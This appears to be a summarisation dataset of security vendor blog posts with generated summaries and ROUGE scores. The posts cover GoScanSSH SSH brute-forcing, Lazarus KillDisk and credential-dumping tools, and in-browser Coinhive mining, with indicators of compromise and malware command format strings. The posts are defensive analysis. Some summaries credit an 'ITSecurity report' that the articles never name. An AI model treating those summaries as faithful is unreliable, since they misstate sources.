a fixed time interval. The result of this process is then transmitted to the C2 server, along with basic survey information about the victim machine when the malware sends a ""checking_in"" message to the C2 server. This message is encrypted prior to being sent to the C2 server. Decrypting this message shows that it is being transmitted using JSON and uses the following format:The malware also obtains a unique identifier, which is also sent to the C2 server as shown in the request above. Talos observed a multitude of these identifiers across the samples that were analyzed, with the same identifier occurring only twice. Examples of different identifiers that were observed are below:In the GoScanSSH sample that Talos analyzed, the malware was configured to reach out to the following C2 server domains:hXXp://5z5zt3qzyp6j4bda[.]onion[.]linkhXXp://5z5zt3qzyp6j4bda[.]onion[.]tohXXp://3xjj3i6rv3bdxd6p[.]onion[.]linkhXXp://3xjj3i6rv3bdxd6p[.]onion[.]tohXXp://b4l7gbnyduslzhq4[.]onion[.]linkhXXp://b4l7gbnyduslzhq4[.]onion[.]toThese domains are being accessed using the Tor2Web proxy service. This service allows systems on the standard internet to access resources hosted on Tor without requiring the system to install a Tor client. Talos has observed malware making increased use of these proxying services as described in a blog post here. By leveraging Tor2Web, attackers can host their C2 infrastructure within the Tor network, without requiring them to include additional Tor functionality within their malware.The communications between the compromised host and the C2 infrastructure are authenticated to ensure that the compromised hosts cannot be hijacked. To implement this, the messages transmitted between infected systems and the C2 servers are encrypted with AES encryption using randomly generated secret keys. The secret keys are also encrypted using RSA asymmetric encryption. The RSA public key is hardcoded within the malware binary. The encrypted secret key and the contents of the JSON being transmitted are concatenated and base64 encoded. This is then sent to the C2 server as the URI portion of an HTTP GET request.Prior to initiating SSH scanning activity, the malware waits for the C2 server to respond to the aforementioned HTTP GET request with the SHA256 hash of the JSON data structure associated with the ""checking_in"" message. If this has not been received, the malware implements a sleep function and will retry this process.Using Investigate from Cisco Umbrella to analyze DNS requests attempting to resolve a single C2 domain from the ones listed above, Talos identified a marked increase in attempts to resolve it, which may be indicative that the number of compromised hosts is continuing to increase.In analyzing passive DNS data related to all of the C2 domains collected from all of the samples Talos analyzed, resolution attempts were seen dating back to June 19, 2017, indicating that this attack campaign has been ongoing for at least nine months. Additionally, the C2 domain with the largest number of resolution requests had been seen 8,579 times.A graph showing the total amount of DNS activity for all of the malicious domains we identified is below:The full list of the 250 domains that Talos identified as related to this ongoing activity can be found in the Indicators of Compromise (IOC) section of this blog.Scanning for Vulnerable SSH ServersOne of the main functions the GoScanSSH malware performs is scanning and identifying additional vulnerable SSH servers exposed to the internet that can be further compromised by the attacker(s). This is performed by first randomly generating an IP address, avoiding special-use addresses. It then compares the IP address to a list of CIDR blocks that the malware will not attempt to scan. The contents of this list are network ranges primarily controlled by various government and military entities, specifically avoiding ranges assigned to the U.S. Department of Defense as listed here. Additionally, one of the network ranges in the list is assigned to an organization in South Korea. If the selected IP falls into these network ranges, it is discarded and a new IP address is generated.The malware then attempts to establish a TCP connection to the selected IP address on TCP/22. If the connection is successfully established, the malware will then perform a reverse DNS lookup to determine if the IP address resolves to any domain names. If the reverse DNS lookup returns a domain, it is compared against a list of domains related to various government and military entities. If the domain matches any of the entries on the list, the connection is terminated, the IP is discarded and a new one is generated. A list of the CIDR blocks and domains included in this process can be found in Appendices A and B.Once it has been determined that the selected IP address is an ideal candidate for additional attacks, the malware attempts to obtain valid SSH credentials by attempting to authenticate to the system using the aforementioned wordlist containing username and password combinations. If successful, the malware reports back to the C2 server. The communication back to the C2 server transmits a banner and other information about the status of the attack in JSON using the following format:Talos believes the attacker then compiles a new malware binary specifically for the compromised system, and infects the new host, causing this process to repeat on the newly infected system.ConclusionThese attacks demonstrate how servers exposed to the internet are at constant risk of attack by cybercriminals. Organizations should employ best practices to ensure that servers they may have exposed remain protected from these and other attacks that are constantly being launched by attackers around the world. Organizations should ensure that systems are hardened, that default credentials are changed prior to deploying new systems to production environments, and that these systems are continuously monitored for attempts to compromise them. Talos is continuing to monitor and track this attack, as well as others across the threat landscape to ensure that customers remain protected as these threats continue to evolve over time.Coverage Additional ways our customers can detect and block this threat are listed below.Advanced Malware Protection (AMP) is ideally suited to prevent the execution of the malware used by these threat actors.CWS or WSA web scanning prevents access to malicious websites and detects malware used in these attacks.Email Security can block malicious emails sent by threat actors as part of their campaign.Network Security appliances such as NGFW, NGIPS, and Meraki MX can detect malicious activity associated with this threat.AMP Threat Grid helps identify malicious binaries and build protection into all Cisco Security products.Umbrella, our secure internet gateway (SIG), blocks users from connecting to malicious domains, IPs, and URLs, whether users are on or off the corporate network.Open Source Snort Subscriber Rule Set customers can stay up to date by downloading the latest rule pack available for purchase onSnort.org.Indicators of Compromise (IOCs)A list of binary hashes (SHA256) associated with this malware can be found here.A list of domains associated with this malware can be found here.Appendix A: IP BlocklistThe following list is used to determine whether the randomly generated IP that the malware uses should not be used to attempt to compromise the system.0.0.0.0/810.0.0.0/8100.64.0.0/10127.0.0.0/8169.254.0.0/16172.16.0.0/12192.0.0.0/24192.0.2.0/24192.88.99.0/24192.168.0.0/16198.18.0.0/15198.51.100.0/24203.0.113.0/24224.0.0.0/4240.0.0.0/4255.255.255.255/326.0.0.0/87.0.0.0/811.0.0.0/821.0.0.0/822.0.0.0/826.0.0.0/828.0.0.0/829.0.0.0/830.0.0.0/833.0.0.0/855.0.0.0/8214.0.0.0/8215.0.0.0/8211.238.159.0/24Appendix B: Domain BlocklistThe following list is used to determine based on the results of a reverse DNS lookup whether to continue attempting to compromise the system. If the domain is in the following list, it is discarded..mil.gov.army.airforce.navy.gov.uk.mil.uk.govt.uk.mod.uk.gov.au.govt.nz.mil.nz.parliament.nz.gov.il.muni.il.idf.il.gov.za.mil.za.gob.es.police.uk";"The GoScanSSH malware is a sophisticated piece of malware that has been actively distributed and improved upon by the attackers. The malware is capable of determining how powerful the infected system is by determining how many hash computations can be performed within a fixed time interval. The result of this process is then transmitted to the C2 server, along with basic survey information about the victim machine when the malware sends a ""checking_in"" message to the C2 server. Talos has observed malware making increased use of these proxying services as described in a blog post here. By leveraging Tor2Web, attackers can host their C2 infrastructure within the Tor network, without requiring them to include additional Tor functionality within their malware. Talos is continuing to monitor and track this attack, as well as others across the threat landscape to ensure that customers remain protected as these threats continue to evolve over time.";en;{'r': 0.13725490196078433, 'p': 0.9702970297029703, 'f': 0.2404907953746397};{'r': 0.08861622358554874, 'p': 0.8904109589041096, 'f': 0.16119032693385155};{'r': 0.13725490196078433, 'p': 0.9702970297029703, 'f': 0.2404907953746397}
https://www.welivesecurity.com/2018/04/03/lazarus-killdisk-central-american-casino/;Lazarus KillDisks Central American casino;"The Lazarus Group gained notoriety especially after cyber-sabotage against Sony Pictures Entertainment in 2014. Fast forward to late 2017 and the group continues to deploy its malicious tools, including disk-wiping malware known as KillDisk, to attack a number of targets.Our analysis shows that the cybercriminals behind the attack against an online casino in Central America, and several other targets in late-2017, were most likely the infamous Lazarus hacking group. In all of these incidents the attackers utilized similar toolsets, including KillDisk, the disk-wiping tool that was executed on compromised machines.Lazarus toolsetThe Lazarus Group was first identified in Novetta's report Operation Blockbuster in February 2016, US?CERT and the FBI call this group Hidden Cobra. These cybercriminals rose into prominence with the infamous case of cyber-sabotage against Sony Pictures Entertainment.Some of the past attacks attributed to the Lazarus Group attracted the interest of security researchers who relied on Novetta et al's white papers with hundreds of pages describing the tools used in the attacks - the Polish and Mexican banks, the WannaCryptor outbreak, phishing campaigns against US defense contractors, etc - and provides grounds for the attribution of these attacks to the Lazarus Group.Note that the Lazarus toolset (i.e. the collection of all files that are considered by the security industry as fingerprints of the group's activity) is quite broad, and we believe there are numerous subgroups. Unlike toolsets used by some other cybercriminal groups, none of the source code of any Lazarus tools has ever been disclosed in a public leak.On top of custom tools, the Lazarus Group also leverages projects that are either available from GitHub or provided commercially.Lazarus tools in casino attackIn this section, we review some of the tools that were detected on numerous servers and endpoints in the network of an online casino in Central America. These were used in conjunction with the destructive KillDisk samples described later. We explain why we believe they are linked to Lazarus. ESET detects known Lazarus malware as Win32/NukeSped or Win64/NukeSped.Almost all of these tools are designed to run as a Windows service. Administrator privileges are necessary to achieve this, which means the attackers expected to have to have those privileges at the time of tool design or compilation.TCP backdoorWin64/NukeSped.W is a console application that is installed in the system as a service. One of the initial execution steps is dynamically resolving the required DLL names, on the stack:Likewise, procedure names of Windows APIs are constructed dynamically. In this particular sample, they are visible in plaintext, in other past samples that we've analyzed they were base64-encoded, encrypted or resolved on the stack character by character:Both are typical traits of Lazarus malware. Another typical Lazarus backdoor characteristic is also seen in this backdoor: it listens on a specific port that it ensures is not blocked by the firewall:The backdoor supports 20 commands whose functionality is similar to previously analyzed Lazarus samples (note that the command names here did not originate from the attackers but were created by an ESET malware analyst):It creates several files on the file system. The listening port is stored in a text file named %WINDOWS%\Temp\p. The file %WINDOWS%\Temp\perflog.evt contains a list of paths of binary files to be injected, executed or written to the Registry depending upon the beginning character:In case of the ""+"" option, the output data of cmd.exe /c ""%s 2>> %s"" (or cmd.exe /c ""%s >> %s 2>&1"") is logged to %WINDOWS%\Temp\perflog.dat.Session hijackerWin64/NukeSped.AB is a console application that creates a process as another currently-logged-in user on the victim's system (similar to command number 17 from the previously described TCP backdoor).It is a Themida-protected variant of a sample described by Kaspersky. In our case, it was installed as C:\Users\public\ps.exe. It accepts three parameters.A static look shows the same file properties in both these samples: the same PE compilation timestamp, identical Rich Header linker data (indicating that the linker was Visual Studio 2010 (10.00)), and part of the resources version info matches:While the PE timestamp and the resources are stolen from the legitimate Microsoft PREVHOST.EXE file from Windows 7 SP1, the linker data was not: the original Microsoft file was compiled and linked by Visual Studio 2008 (9.00).Our consequent, dynamic analysis confirmed that this file - found in the compromised casino's network - is related to the session hijacker used in the Polish and Mexican attacks.Loader/installerThis is a simple command line tool accepting several switches. Its purpose is to work with processes (injecting/killing a process by PID or by name), services (terminating/reinstalling a service) or files (drop/remove). Its exact functionality depends on the parameters.KillDisk variantsKillDisk is a generic detection name that ESET uses for destructive malware with disk wiping capabilities, such as damaging boot sectors and overwriting then deleting (system) files, followed by a reboot to render the machine unusable. Although all KillDisk malware has similar functionality, as a generic detection, individual samples do not necessarily have strong code similarities or relationships. Such generic malware detections usually have many ""sub-families"", distinguished by the detection suffix (e.g. Win32/KillDisk.NBO in this case). Sub-family variants that do have strong code similarities, are sometimes seen separate cyberattacks and thus can help us make connections, as here. Other cases, for example the directed cyberattacks against high-value targets in Ukraine in December 2015 and December 2016, also employed KillDisk malware, but those samples were from different KillDisk sub-families, so are most likely unrelated to these attacks.In the Central American online casino case, we detected two variants of Win32/KillDisk.NBO in their network. This malware was detected on over 100 machines in the organization. There are several possible explanations for its deployment, with the attackers covering their tracks after an espionage operation, or its direct use for extortion or sabotage, being the most probable. In any case, the impact against a single organization is large.Based on our telemetry, the simultaneous use of the detected Win32/KillDisk.NBO variants, and the other known Lazarus malware on the targeted network, we are confident this KillDisk malware was deployed by Lazarus, rather than by another, unrelated attacker.Our analysis of these two Win32/KillDisk.NBO variants revealed that they share many code similarities. Further, they are almost identical to the KillDisk variant used against financial organizations in Latin America, as described by Trend Micro.In this online casino case, the KillDisk variants' path was typically: C:\Windows\Temp\dimens.exeThe actual embedded payload is injected into the system process werfault.exe:One of the variants was protected using the commercial PE protector VMProtect in its 3rd generation, which made unpacking it trickier. The attackers most likely did not buy a VMProtect license but have rather used leaked or pirated copies available on the Internet. Using protectors is common for the Lazarus group: during the Polish and Mexican attacks in February 2017, they made use of Enigma Protector and some of the Operation Blockbuster samples, reported by Palo Alto Networks, used an older version of VMProtect.Common Lazarus format stringsAmong numerous typical characteristics that let us attribute the samples and attacks to Lazarus, one worth pointing out for the sake of other researchers is format strings. The table below lists formatting strings found in the aforementioned samples, as well as in many TCP backdoors linked with Lazarus:Format String Lazarus Attack / Report cmd.exe /c ""%s 2>> %s""cmd.exe /c ""%s >> %s 2>&1"" This case - online casino in Central America cm%sx%s""%s%s %s"" 2>%s Operation Blockbuster &WannaCryptor outbreakc%s.e%sc ""%s > %s 2>&1""%sd.e%sc ""%s > %s 2>&1""Operation Blockbuster - The Sequel %s%s%s ""%s > %s 2>&1""md.exe /cOperation Blockbuster - The Saga %sd.e%sc ""%s > %s"" 2>&1%sd.e%sc n%ssh%srewa%s ad%s po%sop%sing T%s %d ""%s""Operation Blockbuster %s /c ""%s"" >%s 2>&1 Operation Blockbuster cmd.exe /c ""%s"" > %s 2>&1 The Polish and Mexican caseBy itself, this might not seem to be a convincing clue, but checking these format strings against all the malware samples ever collected by ESET, the only results are from samples in suspected Lazarus operations. Hence, we conclude that these format strings represent a relevant, static characteristic of the Lazarus Group's modus operandi.Additional toolsThere are (at least) two widely available tools that the attackers in the online casino case also used.Browser Password DumpThis shady tool serves the purpose of recovering passwords from popular web browsers. However, it is a tool from December 2014, which uses old, well-known techniques. Nevertheless, it can be used effectively on the current, latest versions of Google Chrome (64.0.3282.186), Chromium (67.0.3364.0), Microsoft Edge (41.16299.15.0) and Microsoft Internet Explorer (11.0.9600.17843). It does not work against recent versions of Firefox or Opera.MimikatzThese attackers also used a modified version of the infamous open-source tool Mimikatz, which is used for extracting Windows credentials. It accepts one parameter - the name of the file in which to store the output. If no parameter is given then the output file is called ~Temp1212.tmp located in the same directory as Mimikatz. The output contains hashes of the Windows credentials of currently logged-in users. This tool is commonly used by various APT groups and cybercriminals, for example by the Telebots group in the massive DiskCoder.C (aka NotPetya) outbreak, or in Operation Buhtrap.Infection vectorMost of the tools described above are downloaded and installed onto victim systems by malicious droppers and loaders active in the initial stage of the attack. Moreover, we have seen indicators that the attackers leveraged remote access tools, such as Radmin 3 and LogMeIn, in order to control machines remotely.ConclusionThis recent attack against an online casino in Central America suggests that hacking tools from the Lazarus toolset are recompiled with every attack (we didn't see these exact samples anywhere else). The attack itself was very complex, consisted of several steps, and involved tens of protected tools that, being stand-alone, would reveal little from their dynamics.Utilizing KillDisk in the attack scenario most likely served one of two purposes: the attackers covering their tracks after an espionage operation, or it was used directly for extortion or cyber-sabotage. In any case, the fact that ESET products detected the malware on over 100 endpoints and servers in the organization signifies a large-scale effort of the attackers.Special thanks to David Gabris and Robert Lipovsky.Image Credit: (c) Julliane NovaSAMPLES429B750D7B1E3B8DFC2264B8143E97E5C32803FF Win32/KillDisk.NBO 7DFE5F779E46855B32612D168B9CC5334F25B5F6 Win32/KillDisk.NBO 5042C16076AE6346AF8CF2B40553EEEEA98D5321 Win64/NukeSped.W trojan(VMProtect-ed)7C55572E8573D08F3A69FB15B7FEF10DF1A8CB33 Win64/NukeSped.W trojan(Themida-protected)E7FDEAB60AA4203EA0FF24506B3FC666FBFF759F Win64/NukeSped.Z trojan(Themida-protected)18EA298684308E50E3AE6BB66D7321A5CE664C8E Win64/NukeSped.Z trojan(VMProtect-ed)8826D4EDBB00F0A45C23567B16BEED2CE18B1B6A Win64/NukeSped.AB trojan(Themida-protected)325E27077B4A71E6946735D32224CA0421140EF4 Win64/Riskware.Mimikatz.AapplicationD39311C74DEB60C736982C1AB74D6684DD1E1264 Win32/SecurityXploded.T(VMProtect-ed)E4B763B4E74DE3EF24DB6F19108E70C494CD18C9 Win32/SecurityXploded.T(Themida-protected)Sign up to receive an email update whenever a new article is published in our Ukraine Crisis - Digital Security Resource Center Submit";"The ITSecurity report indicates that the malware sample is related to the session hijacker used in the Polish and Mexican attacks. It is a Themidaprotected variant of a sample described by Kaspersky. In our case, it was installed as C:\Users\public\ps.exe. It accepts three parameters. A static look shows the same file properties in both these samples: the same PE compilation timestamp, identical Rich Header linker data (indicating that the linker was Visual Studio 2010 (10.00)), and part of the resources version info matches: While the PE timestamp and the resources are stolen from the legitimate Microsoft PREVHOST.EXE file from Windows 7 SP1, the linker data was not: the original Microsoft file was compiled and linked by Visual Studio 2008 (9.00). Our consequent, dynamic analysis confirmed that this file found in the compromised casino's network is related to the session hijacker used in the Polish and Mexican attacks. Loader/installer This is a simple command line tool accepting several switches. Its purpose is to work with processes (injecting/killing a process by PID or by name), services (terminating/reinstalling a service) or files (drop/remove). Its exact functionality depends on the parameters. KillDisk variants KillDisk is a generic detection name that ESET uses for destructive malware with disk wiping capabilities, such as damaging boot sectors and overwriting then deleting (system) files, followed by a reboot to render the machine unusable. Although all KillDisk malware has similar functionality, as a generic detection, individual samples do not necessarily have strong code similarities or relationships. Such generic malware detections usually have many ""subfamilies"", distinguished by the detection suffix (e.g. Win32/";en;{'r': 0.21046077210460773, 'p': 0.9548022598870056, 'f': 0.34489795622384434};{'r': 0.14369310793237972, 'p': 0.9057377049180327, 'f': 0.2480359123390534};{'r': 0.21046077210460773, 'p': 0.9548022598870056, 'f': 0.34489795622384434}
https://www.forcepoint.com/blog/x-labs/browser-mining-coinhive-and-webassembly;In-browser mining: Coinhive and WebAssembly;"We covered the basic concepts of blockchain, cryptocurrencies, and coin mining in our previous blog.As we discussed, after a few evolutionary steps via Application Specific Integrated Circuits (ASICs) mining algorithms returned to their roots: the 'humble' personal computer. The suitability of algorithms such as CryptoNight (which underlies the Monero currency) ultimately led to the porting of the source code to JavaScript and a departure from the more traditional approach of having standalone executables for mining, instead executing code from within browser processes.The beginning of in-browser miningThis new approach meant that any browser supporting JavaScript could be used for coin mining, and services soon arose to use the process for the monetisation of websites. This naturally appealed to cybercriminals as there was now no need for the laborious process of deploying and keeping binaries persistent - all that was required was a simple code injection on a web page.The downside of this solution is that, while JavaScript is platform independent, it runs in a browser sandbox, far away from the bare metal and therefore from optimal performance. Another considerable aspect is persistence: while the earlier PC- and IoT-based implementations would run practically forever (or at least until someone found and killed the corresponding process) the browser-based approach can only work for as long as the page containing the miner is kept open.On the other hand, for malicious actors, the web-based approach also provides extra flexibility: there is no need to store everything on the same page. Functionality and components can be split across multiple domains, and previously rented or hacked servers can be (re)used for a new purpose.Coinhive et al.Coinhive is a legitimate service which first surfaced in mid-2017 as a JavaScript-based miner supporting Monero (XMR) mining. Once embedded in a website it uses the visitor's CPU resources for mining, thus providing alternative revenue stream to conventional advertisements. Thanks to its relatively fast adaption - which can at least be partly attributed to the fact that The Pirate Bay was one of its early backers - over a thousand websites included its code by the end of 2017.Fingers soon started to point at the creators, primarily as a result of sites not always being willing to provide an opt-out from running the scripts on their visitors' PCs. Many didn't even bother to inform their visitors about their computers being used in this way.In response, Coinhive created a new version which would become enabled if permission was explicitly given. Unfortunately this offered no guarantee of Coinhive users adopting the new build, especially ones with clear malicious intent in mind.Naturally, the strong uptake of Coinhive resulted in the development of competing services in late 2017 and early 2018 along with several easy to use mining plugins for popular web platforms such as WordPress.WebAssemblyKey to the majority of in-browser coin miners is WebAssembly (abbreviated Wasm): a new binary instruction format using a stack-based virtual machine, designed as a portable target for high level languages like C/C++. Its main design goals include load time efficiency and close to native execution speed in a memory-safe sandboxed environment - i.e. the in-browser JavaScript sandbox. The WebAssembly Community Group is responsible for the open standard.The first 'Minimum Viable Product' (MVP) release of WebAssembly was in March 2017 and the standard is currently supported by all major browsers including Firefox, Chrome, WebKit /Safari and Microsoft Edge.While it has numerous use-cases, many of which are listed within the WebAssembly design documents, it's easy to see how the technology would appeal to coin miner developers: in-browser miners have to live with a significant performance drop compared to 'native' code, and WebAssembly's focus on speed assists in closing this gap. For reference, the developers of Coinhive provide the following performance guidance:Of course, when running through JavaScript performance still takes a bit of a toll, but it's not that bad. Our miner uses WebAssembly and runs with about 65% of the performance of a native Miner.Is it malware?Whether or not in-browser mining is inherently malicious is a matter of contention, with even the security industry harbouring mixed views.Running a hashing algorithm on someone else's PC without their knowledge is a malicious action: ultimately, it is appropriating someone else's resources without their permission. While it shouldn't do any harm to the data or integrity of the machine, it will result in a slower-responding PC and an increased electricity bill, especially if goes unnoticed for a long period of time.On the other hand, performing hashing with a user's consent is not a malicious action - at least some users may be willing to run these scripts if it means no adverts on a website. In early 2018 the Salon website experimented with this approach.From here onwards, please note that when we use the term Coinhive we are exclusively referring to abuse of the Coinhive code and service for the purposes of mining without user consent.When good dogs do bad thingsMalicious users quickly came up with multiple schemes to get miners into people's browsers. Chrome extensions featuring Coinhive code were quickly developed, providing a much-improved return over simple web pages as the miner would run whenever the browser was open. In parallel, a number of Coinhive blocker extensions were developed to try and prevent unauthorised mining on websites.Google's Web Store policy was initially permissive with regards to mining extensions: as long as the extension's sole purpose was mining and the user was adequately informed, it would not be banned. Still, many failed to comply with these policies and, as a result, Google recently moved to tighten the rules effectively banning any mining extensions from the Chrome Web Store.This left the bad guys with the tried-and-true approach of website code injection.How does all this work in the wild?Miners get injected into unwitting websites' code by compromising them, mostly through some vulnerability. Much as has happened for years now, this is typically done by automated software scanning for known vulnerabilities and, once a vulnerable website found, exploitation happens and the malicious JavaScript code is injected.As the popularity of browser-based miners is high amongst cybercriminals, a vulnerable web site can potentially be compromised by more than one actor: as an example, the web site shown below was compromised by three separate cybercriminals - all using slightly different browser miner tools. Note the lack of visible evidence of the miners on the site itself.The image below shows the full infection chain visible in the packet capture when visiting this site:By the time we analysed the site the first of the three miners had been removed, however the other two were still working. The injected code for this inactive miner is shown below.Active Infection 1: 'Basic' MinerThe first active miner is a widely available browser miner tool ('Basic Miner' in the diagrams).It is less sophisticated and easier to block with a web security gateway than the second active miner as it uses minimal obfuscation and static domains for relaying mining traffic to mining pools through WebSocket-based intermediary proxy servers. The image below shows the injection for the 'basic miner'.Upon loading, it first downloads the CryptoNight WASM binary and then immediately begins mining, routing its traffic through publicly known coinhive.com WebSocket proxies (see below).Active Infection 2: 'Advanced' MinerMany publicly available 'grey/black' miners also have private versions for subscribers which are generally intended to be much harder to detect. The second active sample ('Advanced Miner' in the diagrams) is potentially one of these. Its injection code is shown below.It uses a URL shortening service to retrieve the main mining script and uses a slightly more advanced obfuscation technique than the 'basic miner' - although it should be noted that this is still only simple base64 obfuscation, something which would be considered very basic amongst more advanced threats such as exploit kits.Interestingly, this miner uses at least one dynamic-DNS proxy server (see code snippet below) for relaying mining data through WebSocket connections making detection and blocking much more difficult.{""domains"":[""d.cfcnet.top"",""d.cfcnet.gdn"",""d.cfcdist.gdn"",""cfcd.duckdns.org""]}Comparing the Two Active MinersIt is worth noting that the underlying code in the 'basic' and 'advanced' miners is very similar - this broadly appears to be the case with a large number of in-the-wild WebAssembly-based miner, many of which appear to be minor variants of codebases available on GitHub. These 'copycats' are mostly tweaked only slightly in order to avoid detection, usually by altering function names in a 'creative way' (batmanrobin, darkshadow, krypt0n1ght) or by completely removing references to the original C source.The table below compares the functionality of the two miners.'Basic' Miner 'Advanced' Miner Injection Easily detectable, contains in-browser mining related keywords. More innocuous looking, the main miner script is hidden behind a URL shortener. Miner Script Obfuscation Almost non-existent, only the most critical keywords are obfuscated using hex values. Base64 encoding for the whole script, critical keywords are hex encoded, plus some dynamic obfuscation. WebSocket Proxy Infrastructure Publicly known and static, uses coinhive.com WebSocket servers. Private and dynamically updated, making takedown much more difficult.MitigationWeb SocketsA peculiarity of in-browser miners is their reliance on WebSockets for communication. As processes running in a browser sandbox are not permitted to open system sockets, WebSockets were designed to allow full-duplex, asynchronous communications between code running on a webpage and servers - for example, chat applications such as Slack make heavy use of WebSockets.As the standard for WebSockets calls for sessions to be opened as HTTP and then 'Upgraded' to a WebSocket (see the example below), this does not allow for direct communication with the majority of coin mining 'pools' which generally use a protocol called Stratum.As a result, the operators of in-browser mining operations need to set up WebSocket servers to listen for connections from their miners and either process this data themselves if they also operate their own mining pool or 'unwrap' the traffic and forward it to a public pool if they don't.While a coin mining script may appear on dozens or even hundreds of websites, there are likely to be significantly fewer of these WebSocket servers involved in any deployment, thus dramatically simplifying blocking using web proxies: no ability to communicate with the mining pool generally means no mining activity.Disabling WebAssembly and/or JavaScriptNote: The following actions are undertaken at your own risk.Something of a nuclear option, only Firefox and Chrome support disabling Wasm as of April 2018. To do this, follow the instructions below. Before doing this, consider that this approach is likely to prevent the normal operation of an increasing number of sites as the technology is further adopted.In Firefox: navigate to about:config and set javascript.options.wasm to falseIn Chrome: navigate to chrome://flags/enable-webassembly and change it to disabledIf disabling Wasm is the nuclear option, then disabling JavaScript all together is the thermonuclear option. Security advice frequently includes recommendations for plugins such as NoScript for this purpose. While this dramatically improves security, it will once again have an impact on the functionality of websites and you should consider whether it is appropriate for your organisation and browsing habits.Conclusions & protection statementWith the ever-increasing popularity of cryptocurrencies (despite the unstable value of Bitcoin in 2018) the ongoing interest in coin mining is no surprise. The question for the security industry is the one posed above: is it malware?Reduced to its simplest, the mining process is nothing more than arithmetic instructions executed in order to solve a pre-defined piece of a puzzle. This can hardly be considered malicious on its own.The key question is whether this activity occurs with the explicit understanding and approval of the user. As such, blanket blocking all mining scripts without examining their context is not necessarily the best approach.Forcepoint take a combinatory approach to detection and blocking of coin miners associated with compromised websites, blocking the instances of the scripts which we identify but - more critically - blocking the WebSocket command/relay servers which entire campaigns depend on.Thus, Forcepoint customers are protected against this threat at the following stages of attack:Stage 5 (Dropper File) - Malicious files are prevented from being downloaded.Stage 6 (Call Home) - Attempts to contact the C2 server are blocked.Indicators of CompromiseNote: The following list of IOCs is non-exhaustive and focuses primarily on the Wasm samples and campaigns discussed in this article.WebSocket Relay Serverscfcnet[.]top cfcnet[.]gdn cfcdist[.]gdn cfcdist[.]loan cpufan[.]club coinhive[.]comHashes (WebAssembly Files)978c69b6b93a66e47236abc0f36c79096429111d 5117b6d9fd649e5946be0d3cbe4f285d14f64ca2 99e5c6e9bd5ffebf7afe070fb53ee08f10cc707f 96d82c07ef7e15465073bff9e07c30e54f867f50 8a31ff73da067ac87e098effcce909390b568965 16340175dad11597028d434a34365ee46fb815d9 f43a873add72fa6e6b5465d5cdd7ec275dadfaa5 f3353f1a3da825bcc4a552805cf345531a1e48dd eba038b18f32227a9dd1e761fb69029dda6bdbdd 730efe35879cd09c2dc1e18c21f79896fe611120 72616671f4fcebf2b357de851c3598b33108c9a1 957b140c2b28508c78e9b526769f2e9ab6e664da 54612d3dc9ac23c1b49ac3243db12eb5c003118e a3da43bb12093017143c2888c8fddd7e12479bd6 b6c6e98ddca1030b4d9261972506088115fcd04f 58776b6dccf4c0d7a329e64fdeb4f6d13dc3cd2e cbf527baabc7e344cb8f9ec37f0ee490ce800dc1 9392401eb40c0bdac3e22d5430a79af16f3424d5 bcf77c7424c4707b9ea57c82abf1a0859a456784 ba38dc9fb45946228081bd6932e533461e4b3a98 ef58f8c31ab2bc380afc13f691f7b9415aa2dac2 07506bbb3873180d97834622cd55e6cd890a92d2 19c0abdfcf37fdf0bd102b90f6c05b081ea772d0 7bc4adbb43f26f0d954946ae3c4a5e3b91882e9c 04e7b1e1251fb0c18753d0b413f69d5c34c17acf f6a08de1f9c9f79d39455ab31d91c1b44f859116 2a35af592d672d45848548fa17c67b7cc952f05d bc387716f4de26ae78a8c10c9d41b3f40cf517ab d0a66bc0e408e04776e0bec1fc18864974df0198 da6269118b9b8aec68ba7c22de689a7f8e3e1d42 ad765a663c40457cf96c8023500d24f02711f30d b3338cae76b9eacf477af92b4bcfd8cba8f2a516 59d33942585d970b75d2c2e9993d18335edb07bc 8ca54a1a926e5cb0b3a33baa3c58ff3acdbfc515 432fac1f706388be3f7257dd71388021e53038ad 971960066074c62f986215cdf0d85f36b0b33f0f 032c4d6c50c11b3dc247f1941bf77700720ac7e0 29122c16de434eccb4c3abe0c899ae47f9829dde 8c964de7bb13fa9683eed76c419256462393c55c 957cc99377fadb192483a9810660a2fc1f5451fb 608a65e5d08e4cb8362ffbb773a99e78b89d1b5c a0afabb912d593dd2ca9332a1367c1a7614dc3e3 f234378e7b3a93e1dfe06f3efebcee204becaa49 6b7423ab78e38cb8a4263d12c1c2158536fd02cd 57d9f3e422fca7dddbaa381230a6e20921d4a2ac 11c91a43f77f0a7b1da10f52160d52478464c86a b1ce36407b3a456e8bd0fb33b777d84f884db072 c8e27ae2938ea4be173e796f83c843009d21d883 198370faa7488ad8bb95d170880bd52045576eff 4387f76d9c49232f62a41c55c6a48eb38dc97eee 786df01387091a23b15b11385e61e3d441b50bca b291f9545faea0cc4ff8ab44e7ea766f85d4993c 5abf24ed6a7b85b0fae6560fe67bcdc9f8406a11 edd53e16aee9344d580bc3e57b1b2e30d11f5d14 c147b98d461210f8aa835bb9636db2dbf358cd0a";The ITSecurity report provides a comprehensive overview of the current state of affairs with regards to browserbased cryptocurrency mining. It outlines the various methods used by cybercriminals to inject malicious mining code into websites, as well as the various techniques used to detect and block such malicious activity. The summary of the ITSecurity report is that inbrowser cryptocurrency miners are becoming increasingly prevalent and difficult to detect and block. These miners use a variety of techniques to obfuscate their code, including base64 encoding, dynamic obfuscation and the use of WebSockets to communicate with mining pools. The report recommends the use of web proxies to detect and block these miners.;en;{'r': 0.04183266932270916, 'p': 0.6363636363636364, 'f': 0.0785046717396454};{'r': 0.007276507276507277, 'p': 0.14432989690721648, 'f': 0.013854526547804277};{'r': 0.0398406374501992, 'p': 0.6060606060606061, 'f': 0.07476635398263605}
https://www.welivesecurity.com/2018/04/24/sednit-update-analysis-zebrocy/;Sednit update: Analysis of Zebrocy;"Zebrocy heavily used by the Sednit group over last two yearsThe Sednit group - also known as APT28, Fancy Bear, Sofacy or STRONTIUM - is a group of attackers operating since 2004, if not earlier, and whose main objective is to steal confidential information from specific targets.Toward the end of 2015, we started seeing a new component being deployed by the group: a downloader for the main Sednit backdoor, Xagent. Kaspersky mentioned this component for the first time in 2017 in their APT trend report and recently wrote an article where they quickly described it under the name Zebrocy.This new component is a family of malware, comprising downloaders and backdoors written in Delphi and AutoIt. These components play the same role in the Sednit ecosystem as Seduploader -- that of first-stage malware.Victims we have seen targeted by Zebrocy are located in Azerbaijan, Bosnia and Herzegovina, Egypt, Georgia, Iran, Kazakhstan, Korea, Kyrgyzstan, Russia, Saudi Arabia, Serbia, Switzerland, Tajikistan, Turkey, Turkmenistan, Ukraine, Uruguay and Zimbabwe. These targets include embassies, ministries of foreign affairs, and diplomats.The Zebrocy family consists of three components. In the order of deployment these are a Delphi downloader, an AutoIt downloader and a Delphi 